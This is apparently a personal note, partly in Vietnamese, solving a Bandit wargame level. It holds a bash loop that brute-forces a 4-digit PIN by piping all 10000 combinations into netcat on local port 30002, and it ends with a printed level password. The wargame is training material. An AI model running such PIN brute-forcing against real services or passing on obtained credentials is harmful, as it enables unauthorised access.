A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

sẽ phải brute-force mật khẩu từ 0000 đến 9999 vào nc 30002 
viết bash
#!/bin/bash

for i in {0000..9999}
do
        echo <oldpass> $i >> possibilities.txt
done

cat possibilities.txt | nc localhost 30002 > result.txt

rồi cat trong file result tìm pass

p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d